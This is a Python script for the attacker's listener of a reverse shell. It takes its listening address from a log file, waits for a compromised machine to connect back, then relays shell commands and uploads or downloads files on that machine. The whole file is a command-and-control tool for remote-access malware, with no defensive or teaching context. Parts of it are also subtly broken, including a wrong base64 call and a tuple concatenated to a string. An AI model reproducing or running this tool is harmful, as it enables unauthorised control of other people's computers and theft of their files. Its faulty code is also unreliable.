import base64
import json
import simplejson
import socket


class SocketListener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.ip, self.port))
        listener.listen(0)
        print("Listening ...")
        (self.connection, address) = listener.accept()
        print("Connected from" + address)

    def data_receive(self):
        data = ""
        while True:
            try:
                data = data + self.connection.recv(1024).decode()
                return simplejson.loads(data)
            except ValueError:
                continue

    def execute(self, command):
        self.connection.send(simplejson.dumps(command).encode("utf-8"))
        if command[0] == "quit":
            self.connection.close()
            exit()
        return self.data_receive()

    def get_file_content(self, path):
        with open(path, "rb") as f:
            return base64.b64decode(f.read())

    def save_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "Successfully Downloaded"

    def start_listener(self):
        while True:
            command = input("Enter command => ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.get_file_content(command[1])
                    command.append(file_content)

                result = self.execute(command)

                if command[0] == "download":
                    result = self.save_file(command[1], result)
            except Exception:
                result = "Error"
            print(result)


connect_info = ""
with open("logs/variable_logs.txt", "r") as f:
    for line in f:
        pass
    connect_info = line

connect_info = json.loads(connect_info.split(" ")[-1].replace("'", "\""))

socket_listener = SocketListener(connect_info["LHOST"], connect_info["LPORT"])
socket_listener.start_listener()
